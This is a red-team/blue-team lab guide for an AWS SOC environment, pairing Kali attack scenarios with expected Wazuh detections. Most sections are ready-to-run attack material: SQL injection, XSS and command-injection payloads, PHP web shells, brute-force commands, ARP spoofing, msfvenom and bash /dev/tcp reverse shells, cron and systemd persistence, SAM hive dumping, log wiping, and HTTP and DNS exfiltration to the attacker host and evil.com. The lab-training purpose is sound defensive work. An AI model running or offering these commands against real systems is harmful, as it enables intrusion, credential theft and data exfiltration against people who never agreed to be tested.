# Attack Scenarios and Red Team Operations

This guide provides comprehensive attack scenarios for testing your SOC Lab's detection and response capabilities using the Kali Linux attack platform.

## Overview

The attack scenarios are organized by:
- **MITRE ATT&CK Framework** techniques and tactics
- **Difficulty levels** from basic to advanced
- **Target platforms** (Linux, Windows, Web Applications)
- **Detection objectives** for blue team analysis

## Prerequisites

Before starting attack scenarios:
- [ ] Complete SOC Lab deployment ([setup guides](../setup-guides/))
- [ ] All endpoints monitored and agents connected
- [ ] Wazuh dashboard accessible and functional
- [ ] Kali Linux attacker platform configured
- [ ] Network connectivity verified between attacker and targets

## Lab Environment Access

### Connect to Kali Linux Attacker

```bash
# From your local machine
cd terraform
KALI_IP=$(terraform output -raw kali_attacker_public_ip)
JUMP_IP=$(terraform output -raw jump_box_public_ip)

# Direct connection to Kali (if public IP available)
ssh -i ../soc-lab-key.pem kali@$KALI_IP

# Alternative: via jump box
ssh -i ../soc-lab-key.pem ubuntu@$JUMP_IP
ssh -i ~/.ssh/soc-lab-key.pem kali@10.0.3.150  # Kali private IP
```

### Environment Variables Setup

```bash
# On Kali Linux, set target IPs
export LINUX_TARGET="10.0.3.200"
export WINDOWS_TARGET="10.0.3.201"
export WAZUH_SERVER="10.0.3.100"

echo "export LINUX_TARGET=10.0.3.200" >> ~/.bashrc
echo "export WINDOWS_TARGET=10.0.3.201" >> ~/.bashrc
echo "export WAZUH_SERVER=10.0.3.100" >> ~/.bashrc
```

---

## Scenario 1: Web Application Attacks

### 1.1 Reconnaissance and Discovery

**Objective**: Practice information gathering and target identification
**MITRE Technique**: T1595 (Active Scanning)

```bash
# Network discovery
nmap -sn 10.0.3.0/24

# Port scanning
nmap -sS -T4 -p- $LINUX_TARGET

# Service enumeration
nmap -sV -sC -p 22,80,8080,8081,3000 $LINUX_TARGET

# Web service discovery
curl -I http://$LINUX_TARGET
curl -I http://$LINUX_TARGET:8080  # DVWA
curl -I http://$LINUX_TARGET:8081  # WebGoat
curl -I http://$LINUX_TARGET:3000  # Juice Shop

# Directory enumeration
dirb http://$LINUX_TARGET/dvwa/ /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://$LINUX_TARGET/dvwa/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Expected Detections**:
- Port scan detection in Wazuh (rule 40101)
- Multiple HTTP requests from single source
- Directory enumeration patterns

### 1.2 SQL Injection Attacks

**Objective**: Test SQL injection detection and prevention
**MITRE Technique**: T1190 (Exploit Public-Facing Application)

```bash
# Basic SQL injection test
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

# Union-based SQL injection
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

# Database enumeration
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,database()--" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

# Table enumeration
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,table_name FROM information_schema.tables--" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

# Using sqlmap for automated testing
sqlmap -u "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="PHPSESSID=your-session-id; security=low" \
  --dbs --batch

# Advanced: Time-based blind SQL injection
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/sqli/?id=1' AND (SELECT SLEEP(5))--" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"
```

**Expected Detections**:
- SQL injection patterns in web logs (rule 31152)
- Custom DVWA SQL injection rule (100002)
- Automated tool detection (sqlmap user agent)

### 1.3 Cross-Site Scripting (XSS) Attacks

**Objective**: Test XSS detection and filtering
**MITRE Technique**: T1190 (Exploit Public-Facing Application)

```bash
# Reflected XSS
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

# DOM-based XSS
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM-XSS')</script>" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

# Stored XSS via POST
curl -X POST "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/xss_s/" \
  -d "txtName=<script>alert('Stored-XSS')</script>&mtxMessage=Test&btnSign=Sign+Guestbook" \
  -H "Cookie: PHPSESSID=your-session-id; security=low" \
  -H "Content-Type: application/x-www-form-urlencoded"

# XSS with different payloads
PAYLOADS=(
  "<img src=x onerror=alert('XSS')>"
  "<svg onload=alert('XSS')>"
  "javascript:alert('XSS')"
  "<iframe src='javascript:alert(\"XSS\")'></iframe>"
)

for payload in "${PAYLOADS[@]}"; do
  curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/xss_r/?name=$payload" \
    -H "Cookie: PHPSESSID=your-session-id; security=low"
  sleep 2
done
```

**Expected Detections**:
- XSS attack patterns (rule 31161)
- Custom DVWA XSS rule (100003)
- Script injection attempts

### 1.4 Command Injection Attacks

**Objective**: Test command execution detection
**MITRE Technique**: T1190 (Exploit Public-Facing Application)

```bash
# Basic command injection
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/exec/?ip=127.0.0.1;id" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

# Multiple command chaining
COMMANDS=(
  "127.0.0.1;whoami"
  "127.0.0.1 && cat /etc/passwd"
  "127.0.0.1 | ls -la"
  "127.0.0.1 \`id\`"
  "127.0.0.1 \$(whoami)"
)

for cmd in "${COMMANDS[@]}"; do
  curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/exec/?ip=$cmd" \
    -H "Cookie: PHPSESSID=your-session-id; security=low"
  sleep 2
done

# Advanced: Reverse shell attempt
curl "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/exec/?ip=127.0.0.1;nc -e /bin/bash $KALI_IP 4444" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"
```

**Expected Detections**:
- Command injection patterns (rule 31171)
- Custom command injection rule (100004)
- Suspicious command execution

### 1.5 File Upload Attacks

**Objective**: Test malicious file upload detection
**MITRE Technique**: T1190 (Exploit Public-Facing Application)

```bash
# Create malicious PHP file
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
echo "Web Shell Active";
?>
EOF

# Create different malicious files
cat > /tmp/shell.txt << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

cat > /tmp/shell.jpg << 'EOF'
GIF89a
<?php system($_GET['cmd']); ?>
EOF

# Upload attempts
curl -F "uploaded=@/tmp/shell.php" -F "Upload=Upload" \
  "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/upload/" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

curl -F "uploaded=@/tmp/shell.txt" -F "Upload=Upload" \
  "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/upload/" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"

curl -F "uploaded=@/tmp/shell.jpg" -F "Upload=Upload" \
  "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/upload/" \
  -H "Cookie: PHPSESSID=your-session-id; security=low"
```

**Expected Detections**:
- Malicious file upload (rule 100005)
- PHP code in uploaded files
- Suspicious file extensions

---

## Scenario 2: Network-Based Attacks

### 2.1 Password Attacks

**Objective**: Test brute force and password attack detection
**MITRE Technique**: T1110 (Brute Force)

```bash
# SSH brute force attack
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://$LINUX_TARGET -t 4

# Create custom password list
cat > /tmp/passwords.txt << 'EOF'
password
123456
admin
root
ubuntu
test
guest
user
EOF

# Targeted SSH brute force
hydra -l ubuntu -P /tmp/passwords.txt ssh://$LINUX_TARGET -t 2 -w 3

# Web application brute force (DVWA)
hydra -l admin -P /tmp/passwords.txt \
  http-get-form://$LINUX_TARGET:8080/dvwa/login.php:username=^USER^&password=^PASS^:Login failed

# FTP brute force (if available)
hydra -l ftp -P /tmp/passwords.txt ftp://$LINUX_TARGET

# Using medusa for additional testing
medusa -h $LINUX_TARGET -u ubuntu -P /tmp/passwords.txt -M ssh -t 2
```

**Expected Detections**:
- Multiple failed authentication attempts (rule 5716)
- SSH brute force patterns (rule 5720)
- Brute force from single source (rule 100006)

### 2.2 Network Scanning and Enumeration

**Objective**: Test network monitoring and intrusion detection
**MITRE Technique**: T1018 (Remote System Discovery)

```bash
# Comprehensive network scan
nmap -sS -A -T4 10.0.3.0/24

# Aggressive scan with OS detection
nmap -O -sV --version-intensity 9 $LINUX_TARGET $WINDOWS_TARGET

# UDP scan
nmap -sU --top-ports 100 $LINUX_TARGET

# Vulnerability scanning
nmap --script vuln $LINUX_TARGET

# Service enumeration
nmap --script smb-enum-shares,smb-enum-users $WINDOWS_TARGET
nmap --script http-enum $LINUX_TARGET

# Stealth scanning techniques
nmap -sS -f -D RND:10 $LINUX_TARGET  # Fragmented packets with decoys
nmap -sA $LINUX_TARGET  # ACK scan
nmap -sF $LINUX_TARGET  # FIN scan
```

**Expected Detections**:
- Port scan activities (rule 40101)
- Vulnerability scanning patterns
- Suspicious network traffic volume

### 2.3 Man-in-the-Middle Attacks

**Objective**: Test network security monitoring
**MITRE Technique**: T1557 (Adversary-in-the-Middle)

```bash
# ARP spoofing setup
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing attack
ettercap -T -M arp:remote /10.0.3.1// /10.0.3.200//

# DNS spoofing
ettercap -T -M arp:remote -P dns_spoof /10.0.3.1// /10.0.3.200//

# SSL stripping
sslstrip -l 8080 &
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Network sniffing
tcpdump -i eth0 -w /tmp/capture.pcap host $LINUX_TARGET
```

**Expected Detections**:
- ARP anomalies
- SSL/TLS certificate warnings
- Unusual network traffic patterns

---

## Scenario 3: Windows-Specific Attacks

### 3.1 PowerShell-Based Attacks

**Objective**: Test PowerShell execution monitoring
**MITRE Technique**: T1059.001 (PowerShell)

**Note**: These commands should be run on the Windows endpoint or via remote PowerShell if configured.

```powershell
# Basic PowerShell reconnaissance
Get-ComputerInfo
Get-LocalUser
Get-LocalGroup
Get-Process
Get-Service

# Network reconnaissance
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
Get-NetAdapter
Test-NetConnection -ComputerName "10.0.3.100" -Port 1514

# Download and execute (simulation)
Invoke-WebRequest -Uri "http://10.0.3.150/test.txt" -OutFile "C:\temp\test.txt"
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.0.3.150/test.ps1')

# PowerShell Empire style commands
powershell.exe -EncodedCommand <base64-encoded-command>
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Get-Process"

# Credential harvesting simulation
Get-WmiObject -Class Win32_UserAccount
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Process injection simulation
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
"@
Add-Type -MemberDefinition $code -Name Win32 -Namespace Win32Functions
```

**Expected Detections**:
- PowerShell execution events (EventID 4103, 4104)
- Suspicious PowerShell activities (rule 100010)
- Encoded command execution
- Web request from PowerShell

### 3.2 Living Off The Land Attacks

**Objective**: Test detection of legitimate tools used maliciously
**MITRE Technique**: T1218 (Signed Binary Proxy Execution)

```powershell
# Using certutil for download
certutil.exe -urlcache -split -f "http://10.0.3.150/test.txt" C:\temp\test.txt

# Using bitsadmin for download
bitsadmin.exe /transfer test /download /priority high "http://10.0.3.150/test.txt" "C:\temp\test.txt"

# Using regsvr32 for code execution
regsvr32.exe /s /n /u /i:"http://10.0.3.150/test.sct" scrobj.dll

# Using rundll32 for execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('test');

# Using mshta for execution
mshta.exe "http://10.0.3.150/test.hta"

# WMI for persistence
wmic /node:localhost process call create "powershell.exe -Command Get-Process"

# Scheduled task creation
schtasks.exe /create /tn "TestTask" /tr "powershell.exe -Command Get-Date" /sc daily
```

**Expected Detections**:
- Unusual use of system binaries
- Process creation events (Sysmon EventID 1)
- Network connections from system tools
- Scheduled task creation (EventID 4698)

### 3.3 Credential Dumping Simulation

**Objective**: Test credential access monitoring
**MITRE Technique**: T1003 (OS Credential Dumping)

```powershell
# Registry hive access simulation
reg.exe save HKLM\SYSTEM C:\temp\system.hiv
reg.exe save HKLM\SAM C:\temp\sam.hiv
reg.exe save HKLM\SECURITY C:\temp\security.hiv

# LSASS process access simulation
Get-Process lsass | Select-Object ProcessName, Id, WorkingSet

# Windows Credential Manager access
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr

# Security log access
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select-Object -First 10

# Memory dump simulation (requires admin privileges)
# Note: Use with caution in production environments
# procdump.exe -ma lsass.exe C:\temp\lsass.dmp
```

**Expected Detections**:
- Registry hive access (rule 100012)
- LSASS process access
- Credential store access
- Memory dump activities

---

## Scenario 4: Advanced Persistent Threat (APT) Simulation

### 4.1 Initial Access and Reconnaissance

**Objective**: Simulate APT-style multi-stage attack
**MITRE Tactics**: Initial Access, Discovery

```bash
# Stage 1: External reconnaissance
nmap -sS -O $LINUX_TARGET
nmap --script smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-shares,smb-enum-users $WINDOWS_TARGET

# Stage 2: Web application exploitation
sqlmap -u "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="security=low" --os-shell --batch

# Stage 3: Payload delivery
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI_IP LPORT=4444 -f elf > /tmp/payload
python3 -m http.server 8000 &

# Stage 4: Social engineering simulation
curl -F "uploaded=@/tmp/payload" \
  "http://$LINUX_TARGET:8080/dvwa/vulnerabilities/upload/"
```

### 4.2 Persistence and Lateral Movement

**Objective**: Test detection of persistence mechanisms
**MITRE Tactics**: Persistence, Lateral Movement

```bash
# Establish persistence via cron job (Linux)
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$KALI_IP/4444 0>&1'" > /tmp/cron_job

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@kali" >> ~/.ssh/authorized_keys

# Service persistence
cat > /tmp/malicious.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF

# Lateral movement via SSH
sshpass -p 'password' ssh user@$WINDOWS_TARGET "powershell.exe -Command Get-ComputerInfo"
```

### 4.3 Data Exfiltration Simulation

**Objective**: Test data loss prevention monitoring
**MITRE Tactic**: Exfiltration

```bash
# File system reconnaissance
find /var/www -name "*.conf" -o -name "*.log" | head -20
find /etc -name "passwd" -o -name "shadow" -o -name "group" 2>/dev/null

# Simulated sensitive data collection
cat /etc/passwd > /tmp/sensitive_data.txt
ps aux >> /tmp/sensitive_data.txt
netstat -tulpn >> /tmp/sensitive_data.txt

# Data compression and encoding
tar -czf /tmp/exfil.tar.gz /tmp/sensitive_data.txt
base64 /tmp/exfil.tar.gz > /tmp/exfil.b64

# Exfiltration via HTTP
curl -X POST -d @/tmp/exfil.b64 http://$KALI_IP:8080/upload

# DNS exfiltration simulation
for line in $(cat /tmp/sensitive_data.txt | base64 | tr -d '\n' | fold -w 60); do
  nslookup $line.evil.com
  sleep 1
done

# ICMP exfiltration
ping -c 1 -p $(echo "sensitive data" | xxd -p) $KALI_IP
```

**Expected Detections**:
- Large file transfers
- Unusual DNS queries
- Data encoding activities
- Suspicious network connections

---

## Scenario 5: Incident Response Testing

### 5.1 Malware Simulation

**Objective**: Test malware detection capabilities
**MITRE Tactic**: Execution

```bash
# EICAR test file (harmless malware test)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com

# Copy to monitored directories
cp /tmp/eicar.com /var/www/html/
cp /tmp/eicar.com /home/ubuntu/

# Simulate cryptocurrency miner
cat > /tmp/miner.sh << 'EOF'
#!/bin/bash
while true; do
  dd if=/dev/zero of=/dev/null &
  PID=$!
  sleep 60
  kill $PID
done
EOF

chmod +x /tmp/miner.sh
/tmp/miner.sh &
```

### 5.2 Log Tampering Simulation

**Objective**: Test log integrity monitoring
**MITRE Technique**: T1070.002 (Clear Linux or Mac System Logs)

```bash
# Log deletion attempts
rm /var/log/auth.log.1 2>/dev/null
truncate -s 0 /var/log/apache2/access.log 2>/dev/null

# Log modification attempts
echo "fake log entry" >> /var/log/syslog 2>/dev/null

# Clear command history
history -c
rm ~/.bash_history 2>/dev/null

# Clear system logs
journalctl --rotate
journalctl --vacuum-time=1s 2>/dev/null
```

### 5.3 Rootkit Simulation

**Objective**: Test rootkit detection
**MITRE Technique**: T1014 (Rootkit)

```bash
# Hidden file creation
mkdir /tmp/...  # Hidden directory with dots
touch /tmp/.hidden_file

# Process hiding simulation
mv /bin/ps /bin/ps.orig 2>/dev/null
cat > /bin/ps << 'EOF'
#!/bin/bash
/bin/ps.orig "$@" | grep -v "malicious_process"
EOF
chmod +x /bin/ps 2>/dev/null

# Network hiding simulation
iptables -A OUTPUT -p tcp --dport 4444 -j DROP 2>/dev/null
```

---

## Detection and Analysis

### Using Wazuh Dashboard for Analysis

1. **Access Dashboard**: Navigate to `https://localhost:8443`
2. **Security Events**: Review real-time alerts
3. **Discover Tab**: Search and filter events
4. **Custom Dashboards**: Create visualizations for attack patterns

### Key Searches and Queries

**SQL Injection Detection**:
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"rule.id": "100002"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  }
}
```

**PowerShell Activity**:
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"data.win.eventdata.image": "*powershell*"}},
        {"range": {"@timestamp": {"gte": "now-24h"}}}
      ]
    }
  }
}
```

**Failed Authentication Analysis**:
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"rule.groups": "authentication_failed"}},
        {"range": {"@timestamp": {"gte": "now-6h"}}}
      ]
    }
  },
  "aggs": {
    "source_ips": {
      "terms": {"field": "data.srcip"}
    }
  }
}
```

### Creating Custom Alerts

```xml
<!-- Add to /var/ossec/etc/rules/local_rules.xml -->
<rule id="100020" level="15">
  <if_sid>5716</if_sid>
  <same_source_ip />
  <description>Multiple failed authentication attempts - Possible brute force</description>
  <mitre>
    <id>T1110</id>
  </mitre>
  <group>authentication_failures,brute_force</group>
</rule>
```

---

## Blue Team Response Procedures

### Immediate Response Actions

1. **Alert Triage**:
   ```bash
   # Check alert details in Wazuh
   # Verify if attack was successful
   # Assess impact and scope
   ```

2. **Containment**:
   ```bash
   # Block attacker IP
   iptables -A INPUT -s ATTACKER_IP -j DROP
   
   # Isolate affected systems
   # Disable compromised accounts
   ```

3. **Investigation**:
   ```bash
   # Review logs around incident time
   # Check file integrity alerts
   # Analyze network connections
   ```

4. **Recovery**:
   ```bash
   # Remove malicious files
   # Reset compromised credentials
   # Apply security patches
   ```

### Forensic Analysis

```bash
# Log analysis
grep "ATTACKER_IP" /var/log/apache2/access.log
journalctl --since "2023-01-01 12:00:00" | grep -i "failed"

# File system analysis
find /var/www -type f -newer /tmp/reference_time
find / -name "*.php" -exec grep -l "eval\|system\|exec" {} \;

# Network analysis
netstat -tulpn | grep LISTEN
ss -tulpn | grep :4444
```

---

## Advanced Training Scenarios

### Scenario A: Red Team vs Blue Team Exercise

**Duration**: 2-4 hours
**Objective**: Full-scale attack simulation with real-time response

1. **Red Team**: Execute multi-stage attack
2. **Blue Team**: Monitor, detect, and respond
3. **Debrief**: Analyze detection gaps and response effectiveness

### Scenario B: Compliance Testing

**Objective**: Test compliance monitoring capabilities

```bash
# PCI DSS testing
# Test credit card data detection
echo "4111-1111-1111-1111" > /var/www/html/test.txt

# GDPR testing  
# Test personal data detection
echo "John Doe, john@example.com, +1-555-123-4567" > /var/www/html/personal.txt

# SOX testing
# Test financial data access
cat > /var/www/html/financial.csv << 'EOF'
Account,Balance,SSN
123456,10000,123-45-6789
789012,25000,987-65-4321
EOF
```

### Scenario C: Zero-Day Simulation

**Objective**: Test unknown threat detection

```bash
# Custom payload creation
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.3.150 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -f elf > /tmp/zero_day

# Behavioral analysis testing
./zero_day &

# Custom C2 channel
nc -nlvp 4444 &
```

---

## Reporting and Documentation

### Attack Report Template

```markdown
# Attack Scenario Report

## Executive Summary
- Attack type: [SQL Injection/XSS/etc.]
- Duration: [Start time - End time]
- Success rate: [X% of attacks detected]
- Critical findings: [Key issues identified]

## Technical Details
- Target systems: [Linux/Windows endpoints]
- Attack vectors: [Web app/Network/etc.]
- Tools used: [sqlmap, nmap, etc.]
- Detection rules triggered: [Rule IDs]

## Timeline
- [Time]: Initial reconnaissance
- [Time]: Vulnerability exploitation
- [Time]: Alert generated
- [Time]: Response initiated

## Recommendations
1. [Specific security improvements]
2. [Rule tuning suggestions]
3. [Training recommendations]
```

### Metrics and KPIs

Track the following metrics:
- **Mean Time to Detection (MTTD)**
- **Mean Time to Response (MTTR)**
- **False Positive Rate**
- **Alert Volume per Day**
- **Detection Coverage by MITRE ATT&CK**

---

## Troubleshooting

### Common Issues

**Kali Tools Not Working**:
```bash
# Update Kali tools
apt update && apt upgrade -y
apt install kali-tools-top10 -y
```

**Network Connectivity**:
```bash
# Check routing
ip route show
ping -c 3 $LINUX_TARGET

# Check firewall
iptables -L -n
ufw status
```

**Wazuh Not Detecting**:
```bash
# Check agent status
/var/ossec/bin/agent_control -lc

# Check rule syntax
/var/ossec/bin/wazuh-logtest

# Restart services
systemctl restart wazuh-agent
```

---

## Next Steps and Continuous Learning

### Advanced Topics
- **Custom Rule Development**
- **API Integration and Automation**
- **Threat Hunting Techniques**
- **Machine Learning-based Detection**
- **Cloud Security Monitoring**

### Additional Resources
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

### Community and Certification
- **Wazuh Certified Professional**
- **SANS SEC504: Hacker Tools, Techniques, and Incident Handling**
- **EC-Council CEH: Certified Ethical Hacker**
- **CompTIA CySA+: Cybersecurity Analyst**

---

**🎯 Congratulations!** You've completed the comprehensive attack scenarios for the AWS SOC Lab. These exercises provide hands-on experience with both offensive and defensive cybersecurity techniques, preparing you for real-world security operations.

Remember: **Always use these techniques responsibly and only in authorized environments!**
